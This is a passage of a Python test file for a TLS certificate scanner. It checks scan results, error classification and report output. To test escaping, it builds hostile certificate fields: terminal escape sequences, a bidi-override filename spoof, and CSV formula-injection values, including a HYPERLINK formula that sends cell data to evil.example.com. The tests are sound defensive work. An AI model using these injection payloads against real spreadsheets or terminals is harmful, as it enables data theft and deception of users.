            self.assertTrue(row.error.startswith('unparseable certificate: '), row.error)
        with mock.patch.object(sos, 'parse_certificate', side_effect=OverflowError('bug')):
            report = self.scan([sos.Server('a', ['10.0.0.1'])], ['x.example.com'], network)
        self.assertEqual({r.error for r in report.results}, {'unparseable certificate: bug'})

    def test_connect_timeouts(self):
        network = FakeNetwork({'10.0.0.1': socket.timeout('timed out'),
                               '10.0.0.2': TimeoutError(10060, 'timed out')}, {})
        report = self.scan([sos.Server('a', ['10.0.0.1', '10.0.0.2'])], ['x.example.com'],
                           network)
        self.assertEqual({r.status for r in report.results}, {sos.TIMEOUT})
        self.assertEqual(report.server_summaries()[0].status, sos.TIMEOUT)
        self.assertEqual(network.calls, [])

    def test_progress_callback(self):
        events = []
        network = FakeNetwork({}, {'10.0.0.1': by_old_or_new(EC_DER)})
        self.scan([sos.Server('a', ['10.0.0.1'])], ['x.wild.example.net'], network,
                  ports=(443, 8443), progress=lambda *args: events.append(args))
        connect = [e for e in events if e[0] == 'connect']
        tls = [e for e in events if e[0] == 'tls']
        self.assertEqual(connect[-1][1:3], (2, 2))
        self.assertEqual(connect[-1][3], {'open': 2})
        self.assertEqual(tls[-1][1:3], (4, 4))

    def test_keyboard_interrupt_propagates(self):
        network = FakeNetwork({}, {'10.0.0.1': KeyboardInterrupt()})
        with self.assertRaises(KeyboardInterrupt):
            self.scan([sos.Server('a', ['10.0.0.1'])], ['x.example.com'], network)

    def test_parallel_bounded_and_ordered_callbacks(self):
        seen, active, peak = [], [0], [0]
        lock = threading.Lock()

        def work(item):
            with lock:
                active[0] += 1
                peak[0] = max(peak[0], active[0])
            time.sleep(0.005)
            with lock:
                active[0] -= 1
            return item * 2

        sos._parallel(work, list(range(50)), 3, lambda item, res: seen.append((item, res)),
                      threading.Event())
        self.assertEqual(sorted(seen), [(i, i * 2) for i in range(50)])
        self.assertLessEqual(peak[0], 3)

    def test_classify_exception(self):
        cases = [
            (socket.timeout('x'), sos.TIMEOUT), (TimeoutError(), sos.TIMEOUT),
            # phase 2 only runs on ports phase 1 found open: a refusal there is an error
            (ConnectionRefusedError(), sos.TLS_ERROR), (ConnectionResetError(), sos.TLS_ERROR),
            (ssl.SSLEOFError(8, 'eof'), sos.TLS_ERROR), (OSError(5, 'io'), sos.TLS_ERROR),
            (UnicodeError('label too long'), sos.TLS_ERROR), (RuntimeError('x'), sos.TLS_ERROR),
        ]
        for exc, status in cases:
            self.assertEqual(sos.classify_exception(exc)[0], status, repr(exc))
        unrecognized = ssl.SSLError(1, 'x')
        unrecognized.reason = 'TLSV1_UNRECOGNIZED_NAME'
        self.assertEqual(sos.classify_exception(unrecognized)[0], sos.NOT_HOSTED)
        self.assertEqual(sos.classify_connect_exception(OSError(101, 'Network is unreachable')),
                         (sos.CLOSED, 'Network is unreachable'))
        self.assertEqual(sos.classify_connect_exception(ConnectionRefusedError())[0], sos.CLOSED)
        self.assertFalse(sos.is_refusal(ConnectionRefusedError()))  # never "not hosted"

    def test_refused_handshake_after_open_port_is_a_handshake_error(self):
        # the port was open in phase 1, then a rate limiter / fail2ban / restart refused the
        # handshakes: the server must not be reported as "not hosting any of the names"
        cases = {'some': lambda sni: CN_ONLY_DER if sni is None else ConnectionRefusedError(),
                 'all': ConnectionRefusedError()}
        for label, behaviour in cases.items():
            with self.subTest(refused=label):
                network = FakeNetwork({}, {'10.0.0.1': behaviour})
                report = self.scan([sos.Server('s', ['10.0.0.1'])], ['a.wild.example.net'],
                                   network, new_certs=[fixture_cert('cli_renewed_wild.pem')])
                row = self.rows(report, probe=sos.PROBE_SNI)[('s', 443, 'a.wild.example.net')]
                self.assertEqual(row.status, sos.TLS_ERROR)
                self.assertIn('connection refused', row.error)
                self.assertEqual(report.server_summaries()[0].status, sos.TLS_ERROR)
                self.assertEqual(sos.report_to_dict(report)['servers'][0]['errors'],
                                 ['a.wild.example.net'])
                text = sos.render_summary(report)
                self.assertIn('Handshake errors: 1', text)
                self.assertNotIn('not hosting any of the names', text)

    def test_client_context_is_permissive(self):
        context = sos.make_client_context()
        self.assertEqual(context.verify_mode, ssl.CERT_NONE)
        self.assertFalse(context.check_hostname)


# ============================================================================ output

def sample_report():
    renewed = fixture_cert('cli_renewed_wild.pem')
    network = FakeNetwork(
        {'10.0.0.3': ConnectionRefusedError()},
        {'10.0.0.1': by_old_or_new(EC_DER),
         '10.0.0.2': lambda sni: (RENEWED_DER if sni and sni.endswith('wild.example.net')
                                  else CN_ONLY_DER),
         '10.0.0.4': by_old_or_new(RENEWED_DER, default=CN_ONLY_DER),
         '2001:db8::5': ssl.SSLError(1, 'handshake failure'),
         '10.0.0.6': lambda sni: RSA_DER if sni and sni.startswith('www.') else CN_ONLY_DER,
         '10.0.0.7': by_old_or_new(RENEWED_DER, default=EC_DER)})
    servers = [sos.Server('web-old', ['10.0.0.1'], ['prod']),     # NEEDS_UPDATE
               sos.Server('web-new', ['10.0.0.2']),               # UPDATED
               sos.Server('10.0.0.3', ['10.0.0.3']),              # unreachable
               sos.Server('mail', ['10.0.0.4']),                  # UPDATED (+ www elsewhere)
               sos.Server('v6', ['2001:db8::5']),                 # handshake errors
               sos.Server('legacy-app', ['10.0.0.6']),            # only names outside new cert
               sos.Server('partial', ['10.0.0.7'])]               # old default cert
    probes = sos.build_probe_names(['a.wild.example.net', 'b.wild.example.net',
                                    'www.example-test.com.tr'])
    report = sos.run_scan(servers, probes, [443], new_certs=[renewed], timeout=1, workers=4,
                          connect_fn=network.connect_fn, tls_fn=network.tls_fn,
                          warnings=['example warning'])
    return report


# ec_wildcard.pem with the subject and issuer CN (UTF8String, 18 bytes) replaced by terminal
# escapes: erase the line, move up, set the window title. The SAN still covers the names.
HOSTILE_CN = b'\x1b[2K\x1b[1A\x1b]0;x\x07ok'.ljust(18, b'X')


def hostile_cn_der() -> bytes:
    pattern = b'\x06\x03\x55\x04\x03\x0c\x12*.wild.example.net'
    der = EC_DER
    assert der.count(pattern) == 2
    return der.replace(pattern, pattern[:7] + HOSTILE_CN)


class OutputTests(unittest.TestCase):

    @classmethod
    def setUpClass(cls):
        cls.report = sample_report()

    def test_display_text_escapes_controls(self):
        text = sos.display_text('a\x1b[2Kb\x07\x9b\u202ec\r\n\u2028\x7f')
        self.assertEqual(text, 'a\\x1b[2Kb\\x07\\x9b\\u202ec\\x0d\\x0a\\u2028\\x7f')
        self.assertTrue(text.isprintable())
        for kept in ('Let’s Encrypt', 'Türkçe Şirket A.Ş.', '*.example.com',
                     'a\xa0b', ''):
            self.assertEqual(sos.display_text(kept), kept)

    def test_summary_escapes_certificate_controls(self):
        network = FakeNetwork({}, {'10.0.0.1': hostile_cn_der()})
        report = sos.run_scan([sos.Server('s', ['10.0.0.1'])],
                              sos.build_probe_names(['a.wild.example.net']), [443],
                              new_certs=[fixture_cert('cli_renewed_wild.pem')], timeout=1,
                              workers=2, connect_fn=network.connect_fn, tls_fn=network.tls_fn)
        self.assertEqual(report.server_summaries()[0].status, sos.NEEDS_UPDATE)
        for color in (False, True):
            with self.subTest(color=color):
                text = sos.render_summary(report, color=color, show_all=True)
                plain = re.sub(r'\x1b\[[0-9;]*m', '', text)  # the tool's own colours only
                self.assertNotIn('\x1b', plain)
                self.assertNotIn('\x07', plain)
                lines = plain.splitlines()
                current = next(line for line in lines if 'current:' in line)
                self.assertIn('current: \\x1b[2K\\x1b[1A\\x1b]0;x\\x07okXX | expires', current)
                self.assertIn('issuer: \\x1b[2K', current)
                default = next(line for line in lines if 'default certificate (no SNI)' in line)
                self.assertIn('NEEDS_UPDATE  \\x1b[2K', default)
        # the data itself is unchanged: JSON escapes controls on its own
        sha = report.results[0].cert.sha256
        self.assertEqual(json.loads(sos.render_json(report))['certificates'][sha]['subjectCN'],
                         HOSTILE_CN.decode('ascii'))

    def test_render_server_escapes_names_groups_and_errors(self):
        server = sos.Server('web\x1b[2K', ['10.0.0.1'], ['prod\x07'])
        rows = [sos.ProbeResult(server.name, '10.0.0.1', 443, sos.PROBE_SNI, 'a.example.com',
                                'a.example.com', sos.TLS_ERROR, error='bad\rrow')]
        lines = sos._render_server(sos.ServerSummary(server, sos.TLS_ERROR, rows),
                                   sos.Style(False), False, 100, NOW, False)
        text = '\n'.join(lines)
        self.assertNotIn('\x1b', text)
        self.assertNotIn('\x07', text)
        self.assertNotIn('\r', text)
        self.assertIn('web\\x1b[2K', text)
        self.assertIn('[prod\\x07]', text)
        self.assertIn('bad\\x0drow', text)

    def test_json_document_shape(self):
        doc = json.loads(sos.render_json(self.report))
        self.assertEqual(set(doc), {'tool', 'version', 'startedAt', 'finishedAt',
                                    'elapsedSeconds', 'options', 'newCertificates', 'names',
                                    'summary', 'servers', 'endpoints', 'results', 'excluded',
                                    'certificates', 'warnings'})
        self.assertEqual(doc['tool'], 'ssl_origin_scan')
        self.assertEqual(doc['version'], sos.__version__)
        self.assertTrue(doc['finishedAt'].endswith('Z'))
        self.assertEqual(doc['options'], {'ports': [443], 'timeoutSeconds': 1, 'workers': 4,
                                          'exclude': [], 'strictPublic': False, 'privateCa': []})
        self.assertEqual(doc['excluded'], [])
        self.assertEqual(doc['summary']['excludedAddresses'], 0)
        self.assertEqual(doc['newCertificates'][0]['sha256'], RENEWED_WILD_SHA256)
        self.assertEqual(doc['summary']['servers'], 7)
        self.assertEqual(doc['summary']['endpoints'], 7)
        self.assertEqual(doc['summary']['openEndpoints'], 6)
        self.assertEqual(doc['summary']['serversNeedingUpdate'], 2)
        self.assertEqual(doc['summary']['serversUpdated'], 2)
        partial = next(s for s in doc['servers'] if s['name'] == 'partial')
        self.assertEqual(partial['status'], 'NEEDS_UPDATE')
        self.assertTrue(partial['defaultCertNeedsUpdate'])
        self.assertEqual(partial['needsUpdate'], [])
        mail = next(s for s in doc['servers'] if s['name'] == 'mail')
        self.assertEqual(mail['status'], 'UPDATED')
        self.assertEqual(mail['hostedNotInNewCert'], ['www.example-test.com.tr'])
        self.assertEqual([p['name'] for p in doc['names']],
                         ['a.wild.example.net', 'b.wild.example.net', 'www.example-test.com.tr'])
        self.assertEqual(doc['warnings'], ['example warning'])
        server_old = next(s for s in doc['servers'] if s['name'] == 'web-old')
        self.assertEqual(server_old['status'], 'NEEDS_UPDATE')
        self.assertEqual(server_old['groups'], ['prod'])
        self.assertIn('a.wild.example.net', server_old['needsUpdate'])
        row = next(r for r in doc['results'] if r['server'] == 'web-old'
                   and r['name'] == 'a.wild.example.net')
        self.assertEqual(set(row), {'server', 'ip', 'port', 'probe', 'name', 'sni', 'status',
                                    'coveredBy', 'newCertCovers', 'certSha256', 'certSubjectCN',
                                    'certIssuer', 'certSerial', 'certNotAfter', 'certDaysLeft',
                                    'tlsVersion', 'error', 'elapsedMs'})
        self.assertEqual(row['certSha256'], EXPECTED['ec_wildcard.pem']['sha256'])
        self.assertEqual(row['certNotAfter'], '2051-01-01T00:00:00.000Z')
        self.assertIn(row['certSha256'], doc['certificates'])
        self.assertFalse(doc['certificates'][row['certSha256']]['isNewCert'])
        self.assertTrue(doc['certificates'][RENEWED_WILD_SHA256]['isNewCert'])
        closed = next(r for r in doc['results'] if r['server'] == '10.0.0.3')
        self.assertEqual((closed['probe'], closed['status'], closed['name']),
                         ('connect', 'CLOSED', None))
        self.assertEqual(sum(doc['summary']['statusCounts'].values()),
                         len([r for r in doc['results'] if r['probe'] != 'default']))

    def test_csv(self):
        text = sos.render_csv(self.report)
        rows = list(csv.reader(io.StringIO(text)))
        self.assertEqual(tuple(rows[0]), sos.CSV_COLUMNS)
        self.assertEqual(len(rows) - 1, len(self.report.results))
        self.assertTrue(text.endswith('\r\n'))
        header = rows[0]
        match = next(r for r in rows[1:] if r[0] == 'web-new' and r[4] == 'a.wild.example.net')
        record = dict(zip(header, match))
        self.assertEqual(record['status'], 'UPDATED')
        self.assertEqual(record['new_cert_covers'], 'yes')
        self.assertEqual(record['cert_sha256'], RENEWED_WILD_SHA256)
        self.assertTrue(sos.render_csv(self.report, lineterminator='\n').endswith('\n'))

    def test_csv_neutralises_formulas_and_controls_from_certificates(self):
        base = fixture_cert('ec_wildcard.pem')
        link = '=HYPERLINK("http://evil.example.com/?"&A1,"ok")'
        evil = dataclasses.replace(base, subject_cn=link, issuer_cn='@SUM(1)',
                                   issuer={'CN': '@SUM(1)', 'O': '+cmd|x'})
        escapes = dataclasses.replace(base, subject_cn='\tx\x1b[2K', issuer_cn='ok\x07',
                                      issuer={'CN': 'ok\x07'})
        after_expiry = datetime(2052, 1, 1, tzinfo=timezone.utc)  # ec_wildcard: days left < 0
        report = sos.ScanReport(
            servers=[], probes=[], ports=[443], new_certs=[], endpoints=[], certificates={},
            results=[sos.ProbeResult('-web', '192.0.2.1', 443, sos.PROBE_SNI, 'a.example.com',
                                     'a.example.com', sos.NEEDS_UPDATE, cert=evil),
                     sos.ProbeResult('web', '192.0.2.2', 443, sos.PROBE_SNI, 'a.example.com',
                                     'a.example.com', sos.NEEDS_UPDATE, cert=escapes)],
            started_at=after_expiry, finished_at=after_expiry)
        text = sos.render_csv(report)
        rows = list(csv.reader(io.StringIO(text)))
        self.assertEqual(tuple(rows[0]), sos.CSV_COLUMNS)  # the header is never touched
        first, second = (dict(zip(rows[0], row)) for row in rows[1:])
        self.assertEqual(first['cert_subject_cn'], "'" + link)
        self.assertEqual(first['cert_issuer'], "'@SUM(1) (+cmd|x)")
        self.assertEqual(first['server'], "'-web")
        self.assertEqual(first['port'], '443')
        self.assertRegex(first['cert_days_left'], r'^-\d+$')  # a number, left as it is
        self.assertEqual(second['cert_subject_cn'], "'\\x09x\\x1b[2K")
        self.assertEqual(second['cert_issuer'], 'ok\\x07')
        self.assertNotIn('\x1b', text)
        # the JSON report keeps the exact values
        doc = json.loads(sos.render_json(report))
        self.assertEqual(doc['results'][0]['certSubjectCN'], link)
        # a file keeps the format characters of real names (ZWNJ in a Persian O=, a soft
        # hyphen, LRM) and escapes bidi overrides; --csv - escapes both, as the summary
        persian = '\u0646\u0627\u0645\u0647\u200c\u0627\u06cc co\u00adop\u200e'
        named = dataclasses.replace(base, issuer_cn='CA', issuer={'CN': 'CA', 'O': persian},
                                    subject_cn='a\u202egpj.exe\u2066')
        report.results[1] = dataclasses.replace(report.results[1], cert=named)
        second = dict(zip(sos.CSV_COLUMNS, list(csv.reader(io.StringIO(
            sos.render_csv(report))))[2]))
        self.assertEqual(second['cert_issuer'], 'CA (%s)' % persian)
        self.assertEqual(second['cert_subject_cn'], 'a\\u202egpj.exe\\u2066')
        second = dict(zip(sos.CSV_COLUMNS, list(csv.reader(io.StringIO(
            sos.render_csv(report, lineterminator='\n', terminal=True))))[2]))
        self.assertEqual(second['cert_issuer'], 'CA (%s)' % sos.display_text(persian))
        self.assertIn('\\u200c', second['cert_issuer'])
        self.assertEqual(doc['results'][1]['certSubjectCN'], '\tx\x1b[2K')

    def test_csv_formula_rule_matches_the_web_app(self):
        source = (ROOT / 'assets' / 'js' / 'lib' / 'export.js').read_text(encoding='utf-8')
        match = re.search(r'^const FORMULA_START = /\^\[(.*?)\]/;$', source, re.M)
        self.assertIsNotNone(match, 'FORMULA_START in lib/export.js')
        chars = match.group(1).replace('\\-', '-').replace('\\t', '\t').replace('\\r', '\r')
        self.assertEqual(sorted(chars), sorted(sos._CSV_FORMULA_START))

    def test_human_summary_plain(self):
        text = sos.render_summary(self.report, color=False, width=100)
        self.assertNotIn('\x1b[', text)
        need_idx = text.index('Servers that need the new certificate: 2')
        updated_idx = text.index('Already serving the new certificate: 2')
        errors_idx = text.index('Handshake errors: 1')
        other_idx = text.index('Hosting only names the new certificate does not cover: 1')
        self.assertLess(need_idx, updated_idx)
        self.assertLess(updated_idx, errors_idx)
        self.assertLess(errors_idx, other_idx)
        need_block = text[need_idx:updated_idx]
        self.assertIn('web-old', need_block)
        self.assertIn('[prod]', need_block)
        self.assertIn('partial', need_block)
        self.assertIn('default certificate (no SNI): NEEDS_UPDATE  *.wild.example.net',
                      need_block)
        self.assertIn('current: *.wild.example.net | expires 2051-01-01 (', need_block)
        self.assertIn('days left) | issuer: *.wild.example.net', need_block)
        self.assertIn('serial 07 | sha256 1f7337a33d046c66...', need_block)
        updated_block = text[updated_idx:errors_idx]
        self.assertIn('web-new', updated_block)
        self.assertIn('mail', updated_block)
        self.assertIn('www.example-test.com.tr  (not covered by the new certificate)',
                      updated_block)
        self.assertIn('legacy-app', text[other_idx:])
        self.assertIn('handshake failure', text[errors_idx:other_idx])
        self.assertIn('all 3 names', text[errors_idx:other_idx])
        self.assertIn('1 unreachable (no open port)', text)
        self.assertIn('--show-all', text)
        self.assertIn('New certificate: *.wild.example.net | expires 2052-01-01', text)
        self.assertRegex(text, r'Results \(server/port/name\): NEEDS_UPDATE \d+, UPDATED \d+')

    def test_human_summary_show_all_and_color(self):
        text = sos.render_summary(self.report, color=True, show_all=True)
        self.assertIn('\x1b[', text)
        plain = re.sub(r'\x1b\[[0-9;]*m', '', text)
        self.assertIn('Unreachable (no open port): 1', plain)
        self.assertIn('10.0.0.3:443  CLOSED', plain)
        self.assertIn('default certificate (no SNI): NOT_HOSTED', plain)

    def test_summary_without_new_cert(self):
        network = FakeNetwork({}, {'10.0.0.1': by_old_or_new(EC_DER)})
        report = sos.run_scan([sos.Server('s', ['10.0.0.1'])],
                              sos.build_probe_names(['a.wild.example.net']), [443], timeout=1,
                              workers=2, connect_fn=network.connect_fn, tls_fn=network.tls_fn)
        text = sos.render_summary(report)
        self.assertIn('No --cert given', text)
        # EC_DER is self-signed: it hosts the name, as PRIVATE_CERT (--strict-public: NEEDS_UPDATE)
        self.assertIn('Servers hosting the names: 0', text)
        self.assertIn('Serving a self-signed or private-CA certificate: 1', text)
        self.assertIn('PRIVATE_CERT  a.wild.example.net  (self-signed)', text)
        self.assertNotIn('--strict-public counts them', text)  # nothing to count without --cert
        self.assertNotIn('Already serving', text)
        strict = sos.run_scan([sos.Server('s', ['10.0.0.1'])],
                              sos.build_probe_names(['a.wild.example.net']), [443], timeout=1,
                              workers=2, connect_fn=network.connect_fn, tls_fn=network.tls_fn,
                              strict_public=True)
        text = sos.render_summary(strict)
        self.assertIn('Servers hosting the names: 1', text)
        self.assertIn('NEEDS_UPDATE  a.wild.example.net  (self-signed)', text)
        self.assertIn('--strict-public: Cloudflare Origin CA, self-signed and private-CA', text)

    def test_days_text(self):
        style = sos.Style(False)
        cert = fixture_cert('cn_only.pem')
        self.assertEqual(sos._days_text(cert, datetime(2035, 1, 4, tzinfo=timezone.utc), style),
                         'EXPIRED 3 days ago')
        self.assertEqual(sos._days_text(cert, datetime(2034, 12, 31, tzinfo=timezone.utc),
                                        style), '1 day left')
        colored = sos._days_text(cert, datetime(2034, 12, 15, tzinfo=timezone.utc), sos.Style(True))
        self.assertIn('\x1b[31;1m', colored)

    def test_use_color(self):
        class FakeTty(io.StringIO):
            def isatty(self):
                return True

        self.assertFalse(sos.use_color(False, io.StringIO(), env={}))
        self.assertFalse(sos.use_color(True, FakeTty(), env={}))
        self.assertFalse(sos.use_color(False, FakeTty(), env={'NO_COLOR': '1'}))
        if os.name != 'nt':
            self.assertTrue(sos.use_color(False, FakeTty(), env={'NO_COLOR': ''}))
        else:  # no real console behind the fake stream: VT mode cannot be enabled
            self.assertFalse(sos.use_color(False, FakeTty(), env={}))

    def test_progress_printer(self):
        stream = io.StringIO()
        printer = sos.ProgressPrinter(stream, enabled=True)
        printer.update('connect', 1, 4, {'open': 1})
        printer.update('connect', 4, 4, {'open': 3})
        printer.finish()
        self.assertIn('Checking ports: 4/4 (100%) - 3 open', stream.getvalue())
        self.assertTrue(stream.getvalue().endswith('\r'))
        silent = io.StringIO()
        sos.ProgressPrinter(silent, enabled=False).update('tls', 1, 2, {})
        self.assertEqual(silent.getvalue(), '')

    def test_excluded_addresses_in_json_csv_and_summary(self):
        dialled = []  # type: List[str]

        def connect_fn(ip, port, timeout):
            dialled.append(ip)

        network = FakeNetwork({}, {'192.0.2.10': by_old_or_new(EC_DER),
                                   '192.0.2.20': by_old_or_new(EC_DER),
                                   '2001:db8::5': by_old_or_new(EC_DER)})
        servers = [sos.Server('web', ['192.0.2.10', '192.0.2.30'], ['prod']),
                   sos.Server('mail', ['192.0.2.40']),
                   sos.Server('api', ['192.0.2.20', '2001:db8::5', '2001:db8::6'])]
        report = sos.run_scan(servers, sos.build_probe_names(['a.wild.example.net']), [443, 8443],
                              timeout=1, workers=4, connect_fn=connect_fn, tls_fn=network.tls_fn,
                              exclude=['192.0.2.30', '192.0.2.32/28', '2001:db8::6'])
        # never connected to, never handshaken with
        self.assertEqual(sorted(set(dialled)), ['192.0.2.10', '192.0.2.20', '2001:db8::5'])
        self.assertEqual(len(dialled), 6)  # 3 addresses x 2 ports
        self.assertFalse({ip for ip, _, _ in network.calls} - {'192.0.2.10', '192.0.2.20',
                                                               '2001:db8::5'})
        self.assertEqual([s.name for s in report.servers], ['web', 'api'])
        self.assertEqual(report.servers[0].ips, ['192.0.2.10'])
        self.assertEqual(report.excluded_count(), 3)

        doc = json.loads(sos.render_json(report))
        self.assertEqual(doc['options']['exclude'], ['192.0.2.30', '192.0.2.32/28', '2001:db8::6'])
        self.assertEqual(doc['summary']['excludedAddresses'], 3)
        self.assertEqual(doc['excluded'], [
            {'server': 'web', 'ip': '192.0.2.30', 'excludedBy': '192.0.2.30'},
            {'server': 'mail', 'ip': '192.0.2.40', 'excludedBy': '192.0.2.32/28'},
            {'server': 'api', 'ip': '2001:db8::6', 'excludedBy': '2001:db8::6'}])
        self.assertFalse({'192.0.2.30', '192.0.2.40', '2001:db8::6'}
                         & {row['ip'] for row in doc['results']})
        self.assertEqual(doc['summary']['servers'], 2)
        self.assertEqual(doc['summary']['endpoints'], 6)

        rows = list(csv.DictReader(io.StringIO(sos.render_csv(report))))
        excluded_rows = [r for r in rows if r['status'] == 'EXCLUDED']
        self.assertEqual(len(rows), len(report.results) + 3)
        self.assertEqual([(r['server'], r['ip'], r['port'], r['probe']) for r in excluded_rows],
                         [('web', '192.0.2.30', '', 'excluded'), ('mail', '192.0.2.40', '', 'excluded'),
                          ('api', '2001:db8::6', '', 'excluded')])
        self.assertEqual(excluded_rows[1]['error'],
                         'excluded by --exclude 192.0.2.32/28 (never probed)')
        self.assertEqual(rows[-1]['status'], 'EXCLUDED')  # after the scan results

        text = sos.render_summary(report)
        self.assertIn('Excluded by --exclude (never probed): 3 addresses - 192.0.2.30, '
                      '192.0.2.32/28, 2001:db8::6', text.splitlines()[1])
        self.assertIn('\x1b[33m', sos.render_summary(report, color=True))
        self.assertNotIn('Excluded by', sos.render_summary(self.report))  # no --exclude given

        unmatched = sos.run_scan(servers, sos.build_probe_names(['a.wild.example.net']), [443],
                                 timeout=1, workers=2, connect_fn=lambda *a: None,
                                 tls_fn=lambda *a: sos.TlsResult(status='TLS_ERROR', error='x'),
                                 exclude=['203.0.113.0/24'])
        self.assertEqual(unmatched.excluded, [])
        self.assertIn('Excluded by --exclude (never probed): 0 addresses (no target matched '
                      '203.0.113.0/24)', sos.render_summary(unmatched))
        self.assertEqual(json.loads(sos.render_json(unmatched))['summary']['excludedAddresses'], 0)

    def test_iso_and_endpoint_labels(self):
        self.assertEqual(sos.iso_utc(datetime(2025, 1, 2, 3, 4, 5, 678901, tzinfo=timezone.utc)),
                         '2025-01-02T03:04:05.678Z')
        self.assertEqual(sos.iso_utc(datetime(2025, 1, 2, 3, 0, tzinfo=timezone(
            timedelta(hours=3)))), '2025-01-02T00:00:00.000Z')
        self.assertIsNone(sos.iso_utc(None))
        self.assertEqual(sos._endpoint_label('2001:db8::1', 443), '[2001:db8::1]:443')
        self.assertEqual(sos._endpoint_label('10.0.0.1', 8443), '10.0.0.1:8443')


# ============================================================================== CLI

class CliArgumentTests(unittest.TestCase):

    def test_version(self):
        code, out, _ = run_main('--version')
        self.assertEqual(code, 0)
        self.assertIn(sos.__version__, out)

    def test_help_has_examples_and_turkish(self):
        code, out, _ = run_main('--help')
        self.assertEqual(code, 0)
        for needle in ('examples:', '--fail-on-needs-update', 'NEEDS_UPDATE', 'ansible_host',
                       'T\u00fcrk\u00e7e', '--allow-large', 'exit codes',
                       '--exclude ADDR', 'exclude (--exclude, repeatable)', 'EXCLUDED',
                       'excludedAddresses', 'Hostnames are refused', '2026092401', '0x7f.0x1',
                       '0.0.0.0/8', '--exclude ile', 'hi\u00e7 ba\u011flan\u0131lmaz'):
            self.assertIn(needle, out)

    def test_parse_ports(self):
        self.assertEqual(sos.parse_ports('443, 8443,443 9440-9442'),
                         [443, 8443, 9440, 9441, 9442])
        for bad in ('', 'abc', '0', '70000', '10-5', '1-2000', '44 3x'):
            with self.assertRaises(sos.UsageError, msg=bad):
                sos.parse_ports(bad)

    def test_usage_errors_exit_2(self):
        missing_dir = os.path.join(tempfile.gettempdir(), 'no-such-dir-8d1f', 'x.json')
        cases = [
            (),                                                    # -t is required
            ('-t', '127.0.0.1'),                                   # nothing to probe
            ('-t', '127.0.0.1', '-n', 'a.example.com', '-p', '70000'),
            ('-t', '127.0.0.1', '-n', 'a.example.com', '-w', '0'),
            ('-t', '127.0.0.1', '-n', 'a.example.com', '--timeout', '0'),
            ('-t', '127.0.0.1', '-n', 'a.example.com', '--json', '-', '--csv', '-'),
            ('-t', '127.0.0.1', '-n', 'a.example.com', '--json', missing_dir),
            ('-t', '127.0.0.1', '-n', 'missing-names.txt'),
            ('-t', 'missing-targets.txt', '-n', 'a.example.com'),
            ('-t', '10.0.0.0/8', '-n', 'a.example.com'),
            ('-t', '10.0.0.0/8', '-n', 'a.example.com', '--allow-large'),
            ('-t', '-', '-n', '-'),
            ('-t', '127.0.0.1', '--cert', str(FIXTURES / 'does-not-exist.pem')),
            ('-t', '127.0.0.1', '--cert', str(FIXTURES / 'ec_wildcard.key')),
            ('-t', '127.0.0.1', '--bogus-option'),
            # numeric "hostnames" the system resolver would turn into an IPv4 address
            ('-t', '2026092401', '-n', 'a.example.com'),
            ('-t', '0x7f.0x1', '-n', 'a.example.com'),
            ('-t', 'web=127.1', '-n', 'a.example.com'),
            ('-t', '010.0.0.1', '-n', 'a.example.com'),
            ('-t', '127.0.0.1', '-n', '0x7f.0x1'),
            ('-t', '127.0.0.1', '-n', 'a.example.com', '2026092401'),
            ('-t', '0.0.0.0/30', '-n', 'a.example.com'),                # 0.0.0.0/8 only
            # --exclude is strict
            ('-t', '127.0.0.1', '-n', 'a.example.com', '--exclude', 'www.example.com'),
            ('-t', '127.0.0.1', '-n', 'a.example.com', '--exclude', '2026092401'),
            ('-t', '127.0.0.1', '-n', 'a.example.com', '--exclude', 'missing-excludes.txt'),
            ('-t', '127.0.0.1', '-n', 'a.example.com', '--exclude', '192.0.2.0/33'),
            ('-t', '127.0.0.1', '-n', 'a.example.com', '--exclude'),
            ('-t', '127.0.0.1', '-n', 'a.example.com', '--exclude', '127.0.0.0/8'),  # all
            ('-t', '-', '-n', 'a.example.com', '--exclude', '-'),
        ]
        for args in cases:
            with self.subTest(args=args):
                with mock.patch.object(sos, 'tcp_connect',
                                       side_effect=AssertionError('must not connect')), \
                        mock.patch.object(socket, 'getaddrinfo',
                                          side_effect=AssertionError('must not resolve')):
                    code, _, err = run_main(*args)
                self.assertEqual(code, 2)
                self.assertTrue(err.strip())
                self.assertNotIn('Traceback', err)
                self.assertNotIn('must not', err)

    def test_pkcs12_and_csr_messages(self):
        code, _, err = run_main('-t', '127.0.0.1', '--cert', str(FIXTURES / 'cli_bundle.p12'))
        self.assertEqual(code, 2)
        self.assertIn('openssl pkcs12 -in', err)
        with tempfile.TemporaryDirectory() as tmp:
            csr = os.path.join(tmp, 'req.pem')
            with open(csr, 'w') as handle:
                handle.write('-----BEGIN CERTIFICATE REQUEST-----\nMIIB\n'
                             '-----END CERTIFICATE REQUEST-----\n')
            code, _, err = run_main('-t', '127.0.0.1', '--cert', csr)
        self.assertEqual(code, 2)
        self.assertIn('signing request', err)

    def test_certificate_text_in_warnings_is_escaped(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'chain.pem')
            Path(path).write_bytes(pem_of(hostile_cn_der()) + fixture_bytes('ca.pem'))
            with mock.patch.object(sos, 'tcp_connect', side_effect=ConnectionRefusedError()):
                code, out, err = run_main('-t', '127.0.0.1', '--cert', path, '--no-color')
        self.assertEqual(code, 0, err)
        self.assertIn('holds 2 certificates; using the leaf \\x1b[2K\\x1b[1A', err)
        self.assertIn('New certificate: \\x1b[2K', out)
        self.assertNotIn('\x1b', err + out)
        self.assertNotIn('\x07', err + out)

    def test_hostile_cert_file_is_a_usage_error(self):
        with tempfile.TemporaryDirectory() as tmp:
            for label, der in HOSTILE_DERS.items():
                path = os.path.join(tmp, 'hostile.pem')
                Path(path).write_bytes(pem_of(der))
                with self.subTest(cert=label):
                    code, _, err = run_main('-t', '127.0.0.1', '--cert', path)
                    self.assertEqual(code, 2)
                    self.assertIn('no certificate found in', err)
                    self.assertNotIn('Traceback', err)

    def test_no_scannable_targets(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'empty.txt')
            with open(path, 'w') as handle:
                handle.write('# nothing here\n')
            code, _, err = run_main('-t', path, '-n', 'a.example.com')
        self.assertEqual(code, 2)
        self.assertIn('no scannable targets', err)

    def test_keyboard_interrupt_returns_130(self):
        with mock.patch.object(sos, 'run_scan', side_effect=KeyboardInterrupt):
            code, out, err = run_main('-t', '127.0.0.1', '-n', 'a.example.com', '-q')
        self.assertEqual(code, 130)
        self.assertIn('interrupted', err)
        self.assertEqual(out, '')

    def test_unwritable_report_file_is_refused_before_the_scan(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'report.csv')
            Path(path).write_text('last run\n', encoding='utf-8')
